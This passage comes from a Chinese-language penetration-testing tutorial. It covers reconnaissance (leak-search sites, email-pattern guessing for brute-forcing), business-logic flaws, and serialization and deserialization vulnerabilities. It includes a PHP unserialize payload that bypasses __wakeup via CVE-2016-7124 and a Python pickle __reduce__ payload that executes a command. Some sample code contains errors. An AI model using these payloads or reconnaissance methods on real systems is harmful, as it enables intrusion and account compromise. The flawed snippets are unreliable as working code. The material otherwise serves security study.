QQ群备注或介绍等，甚至混入企业qq工作群，然后说再多，也没这个好用`https://sec.xiaomi.com/article/37`全自动监控github

信息泄露收集可能会用到如下地址

网盘搜索

- [http://www.pansou.com/](http://www.pansou.com/)
- [https://www.lingfengyun.com/](https://www.lingfengyun.com/)

网盘密码破解可参考

- [https://www.52pojie.cn/thread-763130-1-1.html](https://www.52pojie.cn/thread-763130-1-1.html)

社工信息泄露

- [https://www.instantcheckmate.com/](https://www.instantcheckmate.com/)
- [http://www.uneihan.com/](http://www.uneihan.com/)

源码搜索

- [https://searchcode.com/](https://searchcode.com/)
- [https://gitee.com/](https://gitee.com/)
- [gitcafe.com](gitcafe.com)
- [code.csdn.net](code.csdn.net)

钟馗之眼

- [https://www.zoomeye.org/](code.csdn.net)

天眼查

- [https://www.tianyancha.com/](https://www.tianyancha.com/)

其它

- 威胁情报：微步在线
- ti.360.cn
- Virustotal

#### <font color="yellow">006 邮箱信息收集</font>

收集邮箱信息主要有两个作用

- 通过发现目标系统账号的命名规律，可以用来后期登入其他子系统
- 爆破登入邮箱用

通常邮箱的账号有如下几种生成规律

比如某公司有员工名叫做张小三，他的邮箱可能如下

- `zhangxiaosan@xxx.com`
- `xiaosan.zhang@xxx.com`
- `zxiaosan@xxx.com`

当我们收集几个邮箱之后，便会大致猜出对方邮箱的命名规律，除了员工的邮箱之外，通过公司会有一些共有的邮箱，比如人力的邮箱、客服的邮箱，`hr@xxx.com`/`kefu@xxx.com`，这种邮箱有时会存在弱口令，在渗透时可额外留意一下，我们可以通过手工或者工具的方式来确定搜集邮箱

手工的方式

> - 可以到百度等搜索引擎上搜索邮箱信息
> - github等第三方托管平台
> - 社工库

工具方式

> 在邮箱收集领域不得不提一个经典的工具，The Harvester，The Harvester可用于搜索Google、Bing和PGP服务器的电子邮件、主机以及子域名，因此需要翻墙运行该工具
> 
> 工具下载地址为
> 
> 	[https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)
> 
> `python -m pip install -r requirements.txt`<font color="red">导入相关配置，python3.6版本</font>
> 
> 使用方式很简单：`./theHarvester.py -d 域名 -1 1000 -b all`

历史漏洞收集

> 仔细分析，大胆验证，发散思维，对企业的运维、开发习惯了解绝对是有很大的帮助，可以把漏洞保存下来，进行统计，甚至炫一点可以做成词云展示给自己看，看着看着或者就知道会有什么漏洞
> 
> wooyun历史漏洞库
> 
> - [http://www.anquan.us/](http://www.anquan.us/)
> - [http://wooyun.2xss.cc/](http://wooyun.2xss.cc/)
> 
> 漏洞银行
> 
> - [https://www.bugbank.cn/](https://www.bugbank.cn/)
> 
> 360补天
> 
> - [https://www.butian.net/](https://www.butian.net/)
> 
> 教育行业漏洞报告平台(Beta)
> 
> - [https://src.edu-info.edu.cn/login/](https://src.edu-info.edu.cn/login/)

#### <font color="yellow">007 工具信息收集</font>

- 7kbscan
- 破壳Web极速扫描器

### <font color="yellow">08 业务漏洞</font>

#### <font color="yellow">001 业务逻辑漏洞</font>

##### <font color="yellow">0001 业务逻辑漏洞定义</font>

业务逻辑漏洞是指由于程序逻辑不严谨或逻辑太复杂，导致一些逻辑分支不能正常处理或处理错误

##### <font color="yellow">0002 业务逻辑漏洞特性</font>

业务逻辑漏洞只出现于业务流程中(模块功能)，也就是说网站的部分都有可能存在逻辑错误漏洞

##### <font color="yellow">0003 业务逻辑漏洞常见分类</font>

业务逻辑漏洞中用户体系包含如下问题

- 密码重置问题
- cookies验证问题
- 越权操作问题

##### <font color="yellow">0004 业务逻辑漏洞常见的危害</font>

- 任意密码修改
- 越权访问
- 密码任意找回
- 交易支付金额任意修改

#### <font color="yellow">002 简介</font>

业务逻辑漏洞是应用程序的设计和实现中的缺陷，攻击者可以利用这些缺陷引发意外行为，这可能使攻击者能够操纵合法功能来实现恶意行为，这些缺陷通常是由于无法预期可能发生的异常应用程序状态，因此无法安全处理它们所导致的，逻辑漏洞通常很难发现的，因为通常不会在应用程序的正常使用中暴露它们，但是，攻击者可以通过开发人员意料之外的方式与应用程序进行交互来攻击利用，业务逻辑的主要设计意图之一是强制执行设计应用程序或功能时定义的规则和约束，业务规则规定了在特定场景发生时应用程序应如何反应，包括阻止用户会对业务产生负面影响的行为，逻辑上的缺陷可以使攻击者绕过这些规则，例如，他们可能无需购买即可完成交易，在其他情况下，可能通过将意外的值传递到服务器端逻辑，攻击者有可能诱使应用程序执行不应执行的操作，基于逻辑的漏洞可能非常多样，并且通常是应用程序及其特定功能所独有的，识别它们通常需要一定数量的专业知识，例如对业务流程的理解或攻击者在给定上下文中可能具有的目标，逻辑漏洞很难使用自动漏洞扫描程序进行检测

#### <font color="yellow">003 产生原因</font>

由于开发团队对用户如何与应用程序交互中错误行为的处理，因此经常会出现业务逻辑漏洞，这些错误的行为可能导致用户输入验证不足，例如，如果开发人员规定用户将仅通过Web浏览器传递数据，则应用程序可能完全依赖不安全的客户端来验证输入，攻击者可以使用拦截代理轻松绕过这些漏洞，最终，这意味着当攻击者输入超出预期的用户行为时，应用程序将无法采取适当的措施来防止这种情况的发生，因此，也就无法安全地处理这种情况，逻辑漏洞在过于复杂的系统中尤其常见，即使开发团队本身也无法完全理解，为了避免逻辑缺陷，开发人员需要从整体上理解应用程序，这包括了解如何以意想不到的方式组合不同的功能，使用大型代码库的开发人员可能对应用程序的所有区域如何工作没有深入的了解，在一个组件上工作的人可能会对另一组件的工作方式做出错误的假设，结果，无意中引入了严重的逻辑缺陷，如果开发人员未明确记录正在做的任何预期行为，则此类漏洞很容易蔓延到应用程序中

#### <font color="yellow">004 示例</font>

##### <font color="yellow">0001 信任不安全的客户端</font>

一个基本的逻辑漏洞是，用户仅仅通过提供的web界面与服务端直接交互，虽然客户端会对用户的恶意输入进行验证，但是攻击者可以通过代理拦截来篡改数据，这些数据是在浏览器发送之后，再发送到服务端，即绕过了客户端的检验，使得客户端检验变得无用

##### <font color="yellow">0002 未能处理非预测输入</font>

业务逻辑的作用之一就是将用户输入限制为符合业务规则的值，例如网上购物商品时，用户通常会指定商品数量，理论上任何整数都可以是有效输入，但是业务逻辑规则不允许用户订购商品数量超过库存数量，也不允许接受负数值的商品数量，当然，此类逻辑漏洞不仅仅发生在商品购物上，还可能在银行转账等功能上

```php
$transferAmount = $_POST['amount'];
$currentBalance = $user->getBalance();
if ($transferAmount <= $currentBalance) {
    // Complete the transfer
} else {
    // Block the transfer: insufficient funds
}
```

若没有验证`account`参数可能存在负值的情况，攻击者可能会利用它来绕过余额检验，并反向转移资金，比如向受害者账户转移了`-1000$`，这可能会使攻击者从受害者那里获取到`1000$`

数量可设为负值

整数型溢出

> 例如c语言中，int型的数值范围是：-2147483647~2147483647
> 
> 将价格最高的商品加入购物车，商品数量设置为最大数量99，利用Intruder一直重复加入购物车

对输入的值处理后未验证

> 服务端有时候处理的用户异常的输入后，未对处理后的值做有效验证，导致了逻辑漏洞的发生，例如可以通过逻辑漏洞未授权访问页面通过`Target > Site map > Engagement tools > Discover content`来发现敏感页面`/admin`，访问发现页面提示只能由DontWannaCry类型的用户访问，通过注册功能发现，可以通过DontWannaCry公司的邮箱来注册一个DontWannaCry类型的用户，使用以下格式的超长email格式地址注册
> 
> ```text
> very-long-string@your-email-id.com
> ```
> 
> `very-long-string`字符(用户名)尽可能的长
		
##### <font color="yellow">0003 篡改或删除参数</font>

web应用程序总是认为用户必须填入相应的字段值或参数，浏览器可能会拦截缺少字段或参数的表单，但攻击者可能会篡改甚至删除传输中的参数，使得可以访问本无法访问的页面，查找该类逻辑漏洞，可以尝试依次修改/删除每一个参数，并观察对应的响应是否有差异，每次只修改/删除一个字段或参数，观察响应，尝试删除参数名和参数值，服务端通常以不同的方式处理这两种情况，一个多步骤的功能(如重置密码分为几个步骤来验证)，在一个步骤中篡改参数会对后面的步骤产生影响，这些存在于GET、POST参数，甚至是Cookie中

删除参数导致的重置任意用户密码

> 代码处理过程可能如下
> 
> ```php
> $username = $_POST['username'];
> $current_passwd = $_POSR['current_password'];
> $password = $_POSR['new_password'];
> 
> if (isset($username) && isset($current_passwd)) {
>     // 验证username和其密码
>     if (check($username, $current_passwd)) {
>         // 验证错误直接return
>     }
> }  
> // 修改username的密码
> modify($username, $password);
> ```

删除参数值导致的重置任意用户密码
	
##### <font color="yellow">0004 破坏验证流程</font>

许多业务逻辑依赖设定好的工作流程或步骤，web界面会引导用户完成此类流程，每一个步骤之间依赖性可能很强，破坏某一步骤都会导致验证机制失效，攻击者会破坏/跳过某个步骤，利用此类逻辑漏洞绕过验证机制，此类漏洞一般是没有对每一个步骤作严格的鉴权验证，简单来说，验证第一个登录因子之后就可以跳过验证第二个登录因子了

###### <font color="yellow">a. 跳过验证码步骤</font>

比如，很多网站登录都采用2FA(two-factor authentication)二因子认证，用户在登录用户名和密码之后，还需要输入发送在用户邮箱的验证码，普通用户肯定会遵循输入验证码的步骤，但是攻击者可能直接跳过此步骤，直接访问敏感页面

###### <font color="yellow">b. 步骤之间验证不严格</font>

在功能的每一个步骤流程中，每一步骤之间的验证机制都不完善，换言之，步骤之间没有特定的鉴权机制，只要有正确的数据包就可以通过，并没有验证此数据包是否是该用户发出的，所以对每一步骤先后顺序的调整都可能对验证流程造成影响

###### <font color="yellow">c. 跳过设置步骤，使用默认配置</font>

例如，一些用户登录之后需要设置自身身份，此时是没有管理员身份的选项的，但是有时候可以通过drop设置的数据包，来使用默认身份，如果Web服务端设置的默认身份为管理员，就可以通过跳过身份设置步骤来使用默认管理员身份

##### <font color="yellow">0005 特定业务逻辑漏洞</font>

一些特殊的业务逻辑容易发生特殊的逻辑漏洞，折扣商店的折扣功能是经典的攻击点，举个很简单的例子，对`1000$`以上的订单，享有10％的折扣，如果业务逻辑在折扣后无法检查订单是否已更改，则可能容易受到滥用，在这种情况下，攻击者可以简单地将商品添加到购物车中，直到达到`1000$`的门槛，然后在下订单，在下订单之前，将不需要的商品删除，然后，即使他们不再满足折扣的标准，他们也将获得订单的折扣

重复使用优惠券：现在有两个优惠券

- SIGNUP30
- NEWCUST5

利用优惠折扣差刷金额：如果一个商场有折扣优惠券 + 商品可兑换为现金的功能，那么可以利用此类功能实现无限刷金额
	
##### <font color="yellow">0006 加解密算法利用</font>

用户可控制加密数据的输入，然后又可以以某种方式使得到密文对应的明文时，这种情况称为encryption oracle，攻击者可以使用一个请求来加密任意数据，使用另一个请求来解密加密的数据得到明文，通俗的来说，直接有了加解密的工具(黑盒状态)，可以透视任何加密的数据

##### <font color="yellow">0007 如何防止业务逻辑漏洞</font>

简而言之，防止业务逻辑漏洞的关键是

- 确保开发人员和测试人员了解应用程序服务的使用范围
- 避免对用户行为或应用程序其他部分的行为做不必要的处理

这包括在继续操作之前确保任何输入的值都是合理的，确保开发人员和测试人员都能够充分理解这些预期行为以及应用程序在不同情况下应如何处理也很重要，这可以帮助团队尽早发现逻辑漏洞，为此，开发团队应尽可能遵循以下最佳实践

- 维护所有事务和工作流的清晰的设计文档和数据流，并注意在每个阶段所做的任何假设
- 尽可能清晰地编写代码。如果很难理解应该发生什么，那么将很难发现任何逻辑漏洞
- 在不可避免的复杂情况下，提供清晰的文档对于确保其他开发人员和测试人员处理的预期行为至关重要
- 注意对使用每个组件的其他代码的任何引用
- 如果恶意方以异常方式操纵它们，请考虑一下这些依赖关系的任何副作用

### <font color="yellow">09 序列化反序列化</font>

#### <font color="yellow">001 Java序列化与反序列化</font>

##### <font color="yellow">0001 基本概念</font>

###### <font color="yellow">a. 序列化和反序列化的定义</font>

Java序列化就是指把Java对象转换为字节序列的过程，Java反序列化就是指把字节序列恢复为Java对象的过程

- 序列化最重要的作用：在传递和保存对象时保证对象的完整性和可传递性，对象转换为有序字节流，以便在网络上传输或者保存在本地文件中
- 反序列化最重要的作用：根据字节流中保存的对象状态及描述信息，通过反序列化重建对象

核心作用就是对象状态的保存和重建(整个过程核心点就是字节流中所保存的对象状态及描述信息)

###### <font color="yellow">b. json/xml的数据传递</font>

在数据传输(也可称为网络传输)前，先通过序列化工具类将Java对象序列化为json/xml文件，在数据传输(也可称为网络传输)后，再将json/xml文件反序列化为对应语言的对象

###### <font color="yellow">c. 序列化优点</font>

- 将对象转为字节流存储到硬盘上，当JVM停机的话，字节流还会在硬盘上默默等待，等待下一次JVM的启动，把序列化的对象，通过反序列化为原来的对象，并且序列化的二进制序列能够减少存储空间(永久性保存对象)
- 序列化成字节流形式的对象可以进行网络传输(二进制形式)，方便了网络传输
- 通过序列化可以在进程间传递对象

###### <font color="yellow">d. 序列化算法需要做的事</font>

- 将对象实例相关的类元数据输出
- 递归地输出类的超类描述直到不再有超类
- 类元数据输出完毕后，从最顶端的超类开始输出对象实例的实际数据值
- 从上至下递归输出实例的数据

##### <font color="yellow">0002 Java实现序列化和反序列化的过程</font>

###### <font color="yellow">a. 实现序列化的必备要求</font>

只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列(不是则会抛出异常)

###### <font color="yellow">b. JDK中序列化和反序列化的API</font>

- `java.io.ObjectInputStream`(对象输入流)：该类的`readObject()`方法从输入流中读取字节序列，然后将字节序列反序列化为一个对象并返回
- `java.io.ObjectOutputStream`(对象输出流)：该类的`writeObject(Object obj)`方法将将传入的obj对象进行序列化，把得到的字节序列写入到目标输出流中进行输出

###### <font color="yellow">c. 实现序列化和反序列化的三种实现</font>

- 若`Student`类仅仅实现了`Serializable`接口，则可以按照以下方式进行序列化和反序列化，`ObjectOutputStream`采用默认的序列化方式，对`Student`对象的非`transient`的实例变量进行序列化，`ObjcetInputStream`采用默认的反序列化方式，对`Student`对象的非`transient`的实例变量进行反序列化
- 若`Student`类仅仅实现了`Serializable`接口，并且还定义了`readObject(ObjectInputStream in)`和`writeObject(ObjectOutputSteam out)`，则采用以下方式进行序列化与反序列化，`ObjectOutputStream`调用Student对象的`writeObject(ObjectOutputStream out)`的方法进行序列化，`ObjectInputStream`会调用Student对象的`readObject(ObjectInputStream in)`的方法进行反序列化
- 若`Student`类实现了`Externalnalizable`接口，且`Student`类必须实现`readExternal(ObjectInput in)`和`writeExternal(ObjectOutput out)`方法，则按照以下方式进行序列化与反序列化，`ObjectOutputStream`调用Student对象的`writeExternal(ObjectOutput out)`的方法进行序列化，`ObjectInputStream`会调用Student对象的`readExternal(ObjectInput in)`的方法进行反序列化

###### <font color="yellow">d. 序列化和反序列化代码示例</font>

```java
public class SerializableTest 
{
    public static void main(String[] args) throws IOException, ClassNotFoundException
	{
        //序列化
        FileOutputStream fos = new FileOutputStream("object.out");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        Student student1 = new Student("lihao", "wjwlh", "21");
        oos.writeObject(student1);
        oos.flush();
        oos.close();
        //反序列化
        FileInputStream fis = new FileInputStream("object.out");
        ObjectInputStream ois = new ObjectInputStream(fis);
        Student student2 = (Student) ois.readObject();
        System.out.println(student2.getUserName()+ " " +
                student2.getPassword() + " " + student2.getYear());
	}
}
```

```java
public class Student implements Serializable
{                             
    private static final long serialVersionUID = -6060343040263809614L;
    private String userName;                                              
    private String password;                                              
    private String year;                                                  
	
    public String getUserName() 
	{                                         
        return userName;                                                  
    }                                                                     

    public String getPassword() 
	{                                         
        return password;                                                  
    }                                                                     

    public void setUserName(String userName) 
	{                            
        this.userName = userName;                                         
    }                                                                     

    public void setPassword(String password) 
	{                            
        this.password = password;                                         
    }                                                                     

    public String getYear() 
	{                                             
        return year;                                                      
    }                                                                     

    public void setYear(String year) 
	{                                    
        this.year = year;                                                 
    }                                                                     
    
	public Student(String userName, String password, String year) 
	{       
        this.userName = userName;                                         
        this.password = password;                                         
        this.year = year;                                                 
    }                                                                     
}                                                                         
```

##### <font color="yellow">0003 序列化和反序列化的注意点</font>

- 序列化时，只对对象的状态进行保存，而不管对象的方法
- 当一个父类实现序列化，子类自动实现序列化，不需要显式实现Serializable接口
- 当一个对象的实例变量引用其他对象，序列化该对象时也把引用对象进行序列化
- 并非所有的对象都可以序列化，至于为什么不可以，有很多原因了

	- 安全方面的原因，比如一个对象拥有private，public等field，对于一个要传输的对象，比如写到文件，或者进行RMI传输等等，在序列化进行传输的过程中，这个对象的private等域是不受保护的
	- 资源分配方面的原因，比如socket，thread类，如果可以序列化，进行传输或者保存，也无法对他们进行重新的资源分配，而且，也是没有必要这样实现

- 声明为static和transient类型的成员数据不能被序列化，因为static代表类的状态，transient代表对象的临时数据
- 序列化运行时使用一个称为 serialVersionUID的版本号与每个可序列化类相关联，该序列号在反序列化过程中用于验证序列化对象的发送者和接收者是否为该对象加载了与序列化兼容的类为它赋予明确的值
	
	显式地定义serialVersionUID有两种用途
	
	- 在某些场合，希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有相同的serialVersionUID
	- 在某些场合，不希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有不同的serialVersionUID

- Java有很多基础类已经实现了serializable接口，比如String,Vector等，但是也有一些没有实现serializable接口的
- 如果一个对象的成员变量是一个对象，那么这个对象的数据成员也会被保存，这是能用序列化解决深拷贝的重要原因

<font color="red">浅拷贝请使用Clone接口的原型模式</font>

#### <font color="yellow">002 C/C++序列化与反序列化</font>

序列化指的是将一个内存对象转化成一串字节数据(存储在一个字节数组中)，可用于保存到本地文件或网络传输，反序列化就是将字节数据还原成内存对象

```C
struct student
{
    int id;
    string name;
};
```

将一个`student`对象转换成字节数据存储在`ByteArray[20]`中称为序列化代码

```C
int count = 0;
char ByteArray[20];
student s;
s.id = 12;
s.name = "specialist";
memcpy(ByteArray,&s.id,sizeof(s.id));
count += sizeof(s.id);
memcpy(ByteArray+count,s.name.c_str(),s.name.length());
count += s.name.length();
```

把字节数据还原成`student`对象称为反序列化代码

```C
student ss;
memcpy(&ss.id,ByteArray,sizeof(ss.id));
ss.name.append(ByteArray+4,count-4);
```

其实在上述代码中存在问题只是`memcpy`函数隐藏了这个细节，在vs的内存窗口中我们可以看到`s.id`的内存视图为`0c 00 00 00`（16进制），这似乎和我们想的`00 00 00 0c`不一样，这就是所谓的大端系统(内存中高位字节在前)和小端系统(内存中低位字节在前)，而目前我们的系统大多是小端系统，而一般在网络传输中却规定使用大端传输(如果不规定当我们将`0c 00 00 00`这四个字节传给对方，对方就不清楚这四个字节的值？`0c 00 00 00 or 00 00 00 0c`)，我们用`memcpy`函数的时候实际上就是对内存的拷贝，而前面讲了在小端系统中对于`s.id`这个值拷贝到`bytearray`中的肯定是`0c 00 00 00`，然后接收端接收到的是`0c 00 00 00`以为你发是12的6次方(也不一定如果对端也是用的C语言直接用`memcpy`将`0c 00 00 00`拷贝`s.id`对应的内存，`s.id`的值还是`12`，就如上述代码，但是客户端和服务端的语言不一定一样)，这显然与你想发的`12`差太多了，于是我们使用位操作(语言无关)来实现序列化与反序列化，以`s.id`为例代码如(注意位操作针对的是数值本身而非内存不要搞混了)
```C
/*移位之后ByteArray中前四个字节存的便是00 00 00 0c*/
ByteArray[0] = s.id>>24; 
ByteArray[1] = s.id>>26; 
ByteArray[2] = s.id>>8;
ByteArray[3] = s.id;
```

接收端再移回来就行了

```C
s.id += ByteArray[0]<<24; 
s.id += ByteArray[1]<<16;
s.id += ByteArray[2]<<8;
s.id += ByteArray[3];
```

#### <font color="yellow">003 php序列化与反序列化</font>

##### <font color="yellow">0001 serialize</font>

序列化是将变量或对象转换成字符串的过程

```php
<?php
	class man
	{
		public $name;
		public $age;
		public $height;

		function __construct($name,$age,$height)
		{
			//_construct：创建对象时初始化
			$this->name = $name;
			$this->age = $age;
			$this->height = $height;
		}
	}
	$man=new man("Bob",5,20);
	var_dump(serialize($man));
?>
```

输出

```text
string(67) "O:3:"man":3:{s:4:"name";s:3:"Bob";s:3:"age";i:5;s:6:"height";i:20;}"
Object(O)： O:<class_name_length>:"<class_name>":<number_of_properties>:{<properties>}
Boolean（b）: b:value;(0或1)
double（d）
integer（i）: i:value;
array（a）： a:<length>:{key,keyvalue}
string（s）: s:<length>:value;
null（N）
```

##### <font color="yellow">0002 unserialize</font>

反序列化是将字符串转换成变量或对象的过程

```php
<?php
	class man
	{
		public $name;
		public $age;
		public $height;

		function __construct($name,$age,$height)
		{
			$this->name = $name;
			$this->age = $age;
			$this->height = $height;
		}
	}
	$man= 'O:3:"man":3:{s:4:"name";s:3:"Bob";s:3:"age";i:5;s:6:"height";i:20;}';
	var_dump(unserialize($man));
?>
```

输出

```text
object(man)#1 (3) 
{
	["name"]=>
	string(3) "Bob"
	["age"]=>
	int(5)
	["height"]=>
	int(20)
}
```

##### <font color="yellow">0003 反序列化漏洞</font>

两个条件

- `unserialize()`函数的参数可控
- php中有可以利用的类并且类中有魔幻函数

魔幻函数

- `_construct()`：创建对象时初始化
- `_destruction()`：结束时销毁对象
- `_toString()`：对象被当作字符串时使用
- `_sleep()`：序列化对象之前调用
- `_wakeup()`：反序列化之前调用
- `_call()`：调用对象不存在时使用
- `_get()`：调用私有属性时使用

index.php

```php
<?php

class SoFun
{

	public $file='index.php';
	function __destruct()
	{

		if(!empty($this->file))
		{

			if(strchr($this-> file,"\\")===false &&  strchr($this->file, '/')===false)
			{

				echo "<br>";
				show_source(dirname (__FILE__).'/'.$this ->file);
				}

			else
				die('Wrong filename.');
		}
	}
	function __wakeup()
	{ 
		$this-> file='index.php'; 
	}  
	public function __toString(){return '' ;}
}
if (!isset($_GET['file']))
{
	show_source('index.php');
} 
else
{ 
	$file = $_GET['file']; 
	echo unserialize($file); 
} 
?>  
<!--key in flag.php-->
```

flag.php

```php
<?php

echo "key{you got it!!}"

?>
```

代码审计

- 代码最后提示key在flag.php里，因此我们要想办法读里面的内容
- 在`__destruct()`魔术方法中，`show_source(dirname (__FILE__).'/'.$this ->file)`这里是解题的关键，在反序列化之后会自动调用`__destruct`方法，可以利用这个将flag.php的内容读出来
- 在`__wakeup()`魔术方法中，在反序列化后会自动调用`__wakeup`方法并将file的值置为index.php
- 我们要想读出flag.php里的内容需要调用`__destruct`方法而绕过`__wakeup`方法

这里要用到CVE-2016-7124漏洞：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过`__wakeup`的执行

构造序列化对象：`O:5:"SoFun":1:{s:4:"file";s:8:"flag.php";}`

构造绕过`__wakeup`：`O:5:"SoFun":2:{s:4:"file";s:8:"flag.php";}`

#### <font color="yellow">004 python序列化与反序列化</font>

##### <font color="yellow">0001 Pyhton在json中load和loads区别</font>

相同点

- dump和dumps都实现了序列化
- load和loads都实现反序列化

变量从内存中变成可存储或传输的过程称之为序列化，序列化是将对象状态转化为可保存或可传输格式的过程，变量内容从序列化的对象重新读到内存里称之为反序列化，反序列化是流转换为对象

区别

- load和loads(反序列化)

	- load

		针对文件句柄，将json格式的字符转换为dict，从文件中读取(将string转换为dict)
		
        ```python
		a_json = json.load(open('demo.json','r'))
		```

	- loads

		针对内存对象，将string转换为dict (将string转换为dict)
		
        ```python
		a = json.loads('{'a':'1111','b':'2222'}')
		```

- dump和dumps(序列化)

	- dump

		将dict类型转换为json字符串格式，写入到文件(易存储)

		```python
        a_dict = {'a':'1111','b':'2222'}
		json.dump(a_dict, open('demo.json', 'w'))
		```

	- dumps

		将dict转换为string(易传输)

		```python
		a_dict = {'a':'1111','b':'2222'}
		a_str = json.dumps(a_dict)
		```
    
##### <font color="yellow">0002 总结</font>

根据序列化和反序列的特性

- loads： 是将string转换为dict
- dumps： 是将dict转换为string
- load： 是将里json格式字符串转化为dict，读取文件
- dump： 是将dict类型转换为json格式字符串，存入文件

JSON进阶

序列化

```python
# 使用class对象的__dict__方法
class Student(object):
    def __init__(self, name, age, score):
        self.name = name
        self.age = age
        self.score = score
import json
s = Student('Bob', 20, 88)
print(json.dumps(s, default=lambda obj: obj.__dict__))
```

反序列化

```python
def dict2student(d):
    return Student(d['name'], d['age'], d['score'])

json_str = '{"age": 20, "score": 88, "name": "Bob"}'
print(json.loads(json_str, object_hook=dict2student))
```
    
##### <font color="yellow">0003 python中的序列化和反序列化</font>

Python提供两个模块来实现序列化

- cPickle
- pickle

这两个模块功能是一样的，区别在于cPickle是C语言写的，速度快，pickle是纯Python写的，速度慢，变量从内存中变成可存储或传输的过程称之为序列化，在Python中叫pickling，变量内容从序列化的对象重新读到内存里称之为反序列化，即unpickling

```python
try:
    import cPickle as pickle
except ImportError:
    import pickle
```

将内存对象存取到磁盘

```python
a = dict(a=1, b=2, c=3)
pickle.dumps(a)# 将对象序列化为str然后存入文件
```

```python
a = dict(a=1, b=2, c=3)
pickle.dump(a, open('a.txt', 'wb'))# 使用dump直接把对象序列化为file-like Object，注意是二进制存储
```

从磁盘读取到内存对象

```python
pickle.load(open('a.txt', 'rb'))#从file-like Object中直接反序列化出对象
```

#### <font color="yellow">005 反序列化漏洞</font>

##### <font color="yellow">0001 漏洞简介</font>

- 序列化：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程，例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式
- 反序列化：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程，例如将二进制数据流或文件加载到内存中还原为对象

反序列化漏洞首次出现在2015，虽然漏洞较新，但利用十分热门，主要原因还是太过信任客户端提交的数据，容易被开发者忽略，该漏洞一般都可执行任意命令或代码，造成的影响较大

##### <font color="yellow">0002 漏洞成因</font>

在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码(如Shiro1.2.4)，使用不安全的反序列化框架库(如Fastjson1.2.24)或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据(执行特定代码或命令的数据)传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的

##### <font color="yellow">0003 漏洞可能出现的位置</font>

- 解析认证token、session的位置
- 将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等
- 将对象序列化后在网络中传输，如传输json数据，xml数据等
- 参数传递给程序
- 使用RMI协议，被广泛使用的RMI协议完全基于序列化
- 使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等
- 定义协议用来接收与发送原始的java对象

##### <font color="yellow">0004 漏洞原理</font>

在Python和PHP中，一般通过构造一个包含魔术方法(在发生特定事件或场景时被自动调用的函数，通常是构造函数或析构函数)的类，然后在魔术方法中调用命令执行或代码执行函数，接着实例化这个类的一个对象并将该对象序列化后传递给程序，当程序反序列化该对象时触发魔术方法从而执行命令或代码

在Java中没有魔术方法，但是有反射(reflection)机制，在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法，这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制

一般利用反射机制来构造一个执行命令的对象或直接调用一个具有命令执行或代码执行功能的方法实现任意代码执行

##### <font color="yellow">0005 Python反序列化漏洞实验</font>

以pickle模块为例，假设浏览器传递序列化后的Cookie给服务器保存，服务器经过一些处理后反序列化还原Cookie

```python
#!/usr/bin/python3
import pickle
# 客户端设置Cookie
set_cookie='abcdefasfsaafasf'
# 序列化后传递
cookie=pickle.dumps(set_cookie)
print("序列化：",cookie)
# ...
# 服务器接收到序列化后的Cookie
# 反序列化还原Cookie
new_cookie=pickle.loads(cookie)
print("反序列化：",new_cookie)
```

程序正常运行时

```text
C:\Users\Infiltrator\Desktop\test\py test.py
序列化:b'\x80\x04\x95\x14\x00\x00\x00\x00\x00\x00\x00\x8c\x10abcdefsaafasf\x94.'
反序列化:abcdefsaafasf
```

利用pickle模块和魔术方法`__reduce__`生成执行命令的Payload

```python
#!/usr/bin/python3
import pickle
import os

# 定义一个执行命令的类
class exec:
	def __init__(self,cmd):
		self.cmd=cmd
	#  __reduce__()函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用，
	#  第二个元素是可调用对象的参数，pickle.loads会解决import问题，对于未引入的module会自动尝试import
	def __reduce__(self):
		return (os.system,(self.cmd,))
# 实例化对象
res=exec('whoami')
# 生成序列化数据
payload=pickle.dumps(res)
print("Payload:",payload)
```

生成执行whoami命令的Payload

```text
C:\Users\Infiltrator\Desktop\test\py test.py
Payload:b'\x80\x04\x95\xle\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
```

使用执行whoami命令的Payload替换序列化后的Cookie的值模拟RCE漏洞利用，当正常程序反序列化Cookie值时生成包含`__reduce__`函数的exec类，从而执行命令

```python
#!/usr/bin/python3
import pickle
# 传递执行whoami命令的序列化数据
cookie=b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
# 反序列化还原Cookie
new_cookie=pickle.loads(cookie)
```

程序运行结果

```text
C:\Users\Infiltrator\Desktop\test\py test.py
laptop-****Ortk\infiltrator
```

##### <font color="yellow">0006 PHP反序列化漏洞实验</font>

PHP中通常使用serialize函数进行序列化，使用unserialize函数进行反序列化

###### <font color="yellow">a. serialize函数输出格式</font>

```text
NULL被序列化为：N
Boolean型数据序列化为：b:1，b:0，分别代表True和False
Integer型数据序列化为：i:数值
String型数据序列化为：s:长度:"值"
对象序列化为：O:类名长度:类名:字段数:字段
```

输出的数字基本都是代表长度，在构造Payload时需要注意修改长度

###### <font color="yellow">b. PHP中常用魔术方法</font>

- `__construct`：当对象被创建时调用
- `__destruct`：当对象被销毁前调用
- `__sleep`：执行`serialize`函数前调用
- `__wakeup`：执行`unserialize`函数前调用
- `__call`：在对象中调用不可访问的方法时调用
- `__callStatic`：用静态方法调用不可访问方法时调用
- `__get`：获得类成因变量时调用
- `__set`：设置类成员变量时调用

使用下面代码创建一个类A并实例化一个对象a，然后输出序列化对象a后的值

```php
<?php
	// 定义一个类
	class A{
		var $test = "Hello";
		function __construct(){
